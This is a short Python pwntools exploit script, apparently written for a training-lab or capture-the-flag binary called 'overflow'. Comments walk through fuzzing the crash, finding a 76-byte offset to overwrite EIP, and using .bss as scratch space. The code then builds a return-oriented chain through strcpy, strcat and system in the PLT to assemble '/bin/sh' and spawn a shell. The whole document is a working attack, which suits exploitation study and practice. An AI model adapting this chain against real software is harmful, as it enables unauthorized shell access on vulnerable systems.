from pwn import *
import sys

# 1. fuzz - SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141}
#			strace ./overflow $(pattern_create -l 100)
#			SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x63413563}
#			pattern_offset -q 0x63413563
#			[*] Exact match at offset 76
# 2. eip overwrite.
#			x += "A" * 76 + "B" * 4
#			SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242}
#
# 3. skeleton exploit
#			no-pie enabled. Use any function() on the stack.
#			.bss - memory area of uninitialized global variables.
#			"bss is a scratch-pad for hackers."
#			objdump -D ./overflow | grep -i bss
#			Disassembly of section .bss:
#			0804a030 <__bss_start>:
#
#				
# strcpy(&bss, &"/b" );
# strcat(&bss, &"in/");
# strcat(&bss,&"sh");
# system(&bss)
#			

strcpy_plt = 0x8048380
strcat_plt = 0x8048370
system_plt = 0x80483a0
binsh1 = 0x804954e		# /b
binsh2 = 0x8049565		# in/
binsh3 = 0x80486ce		# sh
bss = 0x0804a030 		# <__bss_start>:
pop2ret = 0x80485da


# The only syscall is system(). strcpy & strcat are libc functions w/ args1.
# Which registers take "&bss" arg and "&binsh1" arg?
x = ""
x += "A" * 76
x += p32(strcpy_plt)	# strcpy(&bss, &"/b" );
x += p32(pop2ret)
x += p32(bss)
x += p32(binsh1)		
x += p32(strcat_plt)	# strcat(&bss, &"in/");	
x += p32(pop2ret)
x += p32(bss)
x += p32(binsh2)
x += p32(strcat_plt)	# strcat(&bss, &"sh");
x += p32(pop2ret)
x += p32(bss)
x += p32(binsh3)
x += p32(system_plt)	# system(&bss)
x += "JUNK"
x += p32(bss)			# /bin/sh

print x

